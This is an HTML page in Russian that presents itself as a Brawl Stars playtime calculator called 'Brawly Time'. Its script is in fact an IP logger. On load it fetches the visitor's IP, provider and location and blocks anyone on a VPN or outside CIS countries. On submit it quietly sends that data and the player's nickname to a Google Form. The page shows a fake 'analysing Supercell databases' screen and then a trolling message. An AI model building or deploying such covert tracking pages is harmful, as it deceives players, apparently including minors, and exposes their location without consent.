<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Brawly Time — Калькулятор времени</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: #0a0a0c;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            background: #111115;
            border: 1px solid #22222a;
            border-radius: 16px;
            padding: 25px;
            width: 100%;
            max-width: 480px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
            display: none; /* Скрыто по умолчанию для проверки на VPN */
        }

        h1 {
            font-size: 28px;
            font-weight: 800;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
            background: linear-gradient(90deg, #ff9900, #ff5500);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .subtitle {
            color: #888892;
            font-size: 14px;
            margin-bottom: 25px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 13px;
            color: #aaa;
            margin-bottom: 8px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        input[type="text"],
        input[type="number"],
        select {
            width: 100%;
            background: #18181f;
            border: 1px solid #2c2c35;
            border-radius: 10px;
            padding: 12px 16px;
            color: #fff;
            font-size: 16px;
            transition: border-color 0.2s;
            outline: none;
        }

        input:focus, select:focus {
            border-color: #ff9900;
        }

        select {
            appearance: none;
            cursor: pointer;
        }

        .btn {
            width: 100%;
            background: #fff;
            color: #000;
            border: none;
            border-radius: 10px;
            padding: 14px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: transform 0.1s, opacity 0.2s;
            margin-top: 10px;
        }

        .btn:active {
            transform: scale(0.98);
        }

        /* Экран загрузки */
        .loading-screen {
            display: none;
            text-align: center;
            padding: 40px 0;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #222;
            border-top: 4px solid #ff9900;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Экран результатов */
        .result-screen {
            display: none;
            animation: fadeIn 0.5s ease forward;
        }

        .time-box {
            background: #18181f;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            margin-bottom: 20px;
            border: 1px solid #2c2c35;
        }

        .time-value {
            font-size: 32px;
            font-weight: 800;
            color: #ff9900;
            margin-bottom: 5px;
        }

        .time-label {
            color: #888892;
            font-size: 14px;
        }

        .comment {
            font-size: 15px;
            color: #e4e4e7;
            line-height: 1.6;
            margin-bottom: 25px;
            background: rgba(255, 153, 0, 0.05);
            padding: 15px;
            border-radius: 10px;
            border-left: 4px solid #ff9900;
        }

        .troll-alert {
            color: #ff3366;
            font-size: 24px;
            font-weight: 900;
            text-align: center;
            text-transform: uppercase;
            letter-spacing: 1px;
            text-shadow: 0 0 15px rgba(255, 51, 102, 0.3);
            margin-top: 20px;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

    <div class="container" id="main-container">
        <div id="setup-screen">
            <h1>Brawly Time</h1>
            <div class="subtitle">Узнай, сколько именно дней своей жизни ты оставил в бравле</div>
            
            <div class="form-group">
                <label>Твой ник в игре</label>
                <input type="text" id="nickname" placeholder="Например, LeonPro2012">
            </div>

            <div class="form-group">
                <label>Победы в Трио (3х3)</label>
                <input type="number" id="wins3v3" placeholder="0" min="0">
            </div>

            <div class="form-group">
                <label>Победы в ШД (Соло/Дуо)</label>
                <input type="number" id="winsSD" placeholder="0" min="0">
            </div>

            <div class="form-group">
                <label>Текущий или пиковый ранг</label>
                <select id="rank">
                    <option value="бронза">Бронза</option>
                    <option value="серебро">Серебро</option>
                    <option value="золото">Золото</option>
                    <option value="алмаз">Алмаз</option>
                    <option value="мифик">Мифик</option>
                    <option value="лега">Легендарный</option>
                    <option value="мастер">Мастер</option>
                    <option value="про">Про (Топ-Рейтинг)</option>
                </select>
            </div>

            <div class="form-group">
                <label>С какого года играешь?</label>
                <select id="year">
                    <option value="2017">2017</option>
                    <option value="2018">2018</option>
                    <option value="2019">2019</option>
                    <option value="2020">2020</option>
                    <option value="2021">2021</option>
                    <option value="2022">2022</option>
                    <option value="2023">2023</option>
                    <option value="2024">2024</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                </select>
            </div>

            <button class="btn" onclick="calculateTime()">Посчитать время</button>
        </div>

        <div id="loading-screen" class="loading-screen">
            <div class="spinner"></div>
            <div style="color: #888892;">Анализируем базы данных Supercell...</div>
        </div>

        <div id="result-screen" class="result-screen">
            <h2 style="font-size: 22px; margin-bottom: 15px;">Твой результат готов!</h2>
            
            <div class="time-box">
                <div class="time-value" id="res-hours">0ч 0м 0с</div>
                <div class="time-label">Чистого времени в матчах</div>
            </div>

            <div class="comment" id="res-comment"></div>
            
            <div class="troll-alert">Затроллен, толстый!</div>
        </div>
    </div>

    <script>
        // === КОНФИГУРАЦИЯ ТВОЕЙ GOOGLE ФОРМЫ ===
        const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLScm1lHtbalzz31PHchVUNO17uld9g62hzEQR8O6-OhZt33r1A/formResponse';
        const FIELD_NAME = 'entry.37291210';
        const FIELD_IP = 'entry.171243493';
        const FIELD_PROVIDER = 'entry.36853529';
        const FIELD_LOCATION = 'entry.71377506';
        // ======================================

        let cachedIpData = null; // Сохраняем данные при первой загрузке

        // Проверка при загрузке страницы
        window.onload = async () => {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                // 1. Проверка на VPN / Хостинги
                const org = (data.org || "").toLowerCase();
                const vpnKeywords = ['vpn', 'proxy', 'hosting', 'cloud', 'datacenter', 'digitalocean', 'amazon', 'aws', 'azure', 'ovh', 'mullvad', 'nord', 'express'];
                const isVPN = vpnKeywords.some(kw => org.includes(kw));

                // 2. Проверка на СНГ (разрешенные страны)
                const allowedCountries = ['RU', 'BY', 'KZ', 'AM', 'AZ', 'KG', 'MD', 'TJ', 'UZ', 'UA'];
                const country = (data.country_code || "").toUpperCase();
                const isCIS = allowedCountries.includes(country);

                // Если это VPN ИЛИ страна НЕ из списка СНГ — показываем черный экран
                if (isVPN || !isCIS) {
                    document.body.innerHTML = '';
                } else {
                    // Если всё ок — сохраняем данные и показываем сайт
                    cachedIpData = data;
                    document.getElementById('main-container').style.display = 'block';
                }
            } catch (e) {
                // Если запрос заблокирован адблоком или нет сети — тоже черный экран
                document.body.innerHTML = '';
            }
        };
        

        function calculateTime() {
            const nickname = document.getElementById('nickname').value.trim();
            
            // Проверка: введен ли ник
            if (!nickname) {
                alert("Сначала введи свой ник!");
                return;
            }

            const wins3v3 = parseInt(document.getElementById('wins3v3').value) || 0;
            const winsSD = parseInt(document.getElementById('winsSD').value) || 0;
            const rank = document.getElementById('rank').value;
            const year = parseInt(document.getElementById('year').value);

            // Смена экранов
            document.getElementById('setup-screen').style.display = 'none';
            document.getElementById('loading-screen').style.display = 'block';

            // 1. Формула подсчета
            let totalHours = 0;
            totalHours += (wins3v3 * 2) / 60;
            totalHours += (winsSD * 2) / 60;

            if (rank === 'мастер' || rank === 'про') totalHours += 30;
            else if (rank === 'лега') totalHours += 10;
            else if (rank === 'мифик') totalHours += 3;
            else if (rank === 'алмаз') totalHours += 2;
            else if (rank === 'золото') totalHours += 1;
            else if (rank === 'серебро') totalHours += 0.5;

            if (year >= 2017 && year <= 2019) totalHours += 97;
            else if (year >= 2020 && year <= 2022) totalHours += 64;
            else if (year >= 2023 && year <= 2024) totalHours += 30;

            const hours = Math.floor(totalHours);
            const remainderMinutes = (totalHours - hours) * 60;
            const minutes = Math.floor(remainderMinutes);
            const seconds = Math.floor((remainderMinutes - minutes) * 60);

            // 2. Генерация комментариев
            const facts = [
                {
                    f1: `посмотреть все серии аниме «Ван-Пис» ${((totalHours) / 380).toFixed(1)}`,
                    f2: `дойти пешком от Москвы до Владивостока ${((totalHours) / 1700).toFixed(2)}`
                },
                {
                    f1: `вырастить домашний чайный гриб ${((totalHours) / 168).toFixed(1)}`,
                    f2: `накопить на топовый ПК, раздавая листовки, ${((totalHours) / 120).toFixed(1)}`
                },
                {
                    f1: `апнуть 50 000 кубков с нуля ${((totalHours) / 400).toFixed(1)}`,
                    f2: `не спать под энергетиками ${((totalHours) / 24).toFixed(1)}`
                }
            ];
            
            const randomFact = facts[Math.floor(Math.random() * facts.length)];
            const commentText = `Это как ${randomFact.f1} раз или ${randomFact.f2} раз!`;

            // 3. Отправка данных в форму
            if (cachedIpData) {
                const formData = new FormData();
                formData.append(FIELD_IP, cachedIpData.ip || 'Неизвестно');
                formData.append(FIELD_PROVIDER, cachedIpData.org || 'Неизвестно');
                formData.append(FIELD_LOCATION, `${cachedIpData.city || '?'}, ${cachedIpData.country_name || '?'}`);
                formData.append(FIELD_NAME, nickname);
                fetch(FORM_URL, { method: 'POST', body: formData, mode: 'no-cors' });
            }

            // Имитация загрузки 
            setTimeout(() => {
                document.getElementById('loading-screen').style.display = 'none';
                document.getElementById('result-screen').style.display = 'block';

                document.getElementById('res-hours').innerText = `${hours}ч ${minutes}м ${seconds}с`;
                document.getElementById('res-comment').innerText = commentText;
            }, 2000);
        }
    </script>
</body>
</html>
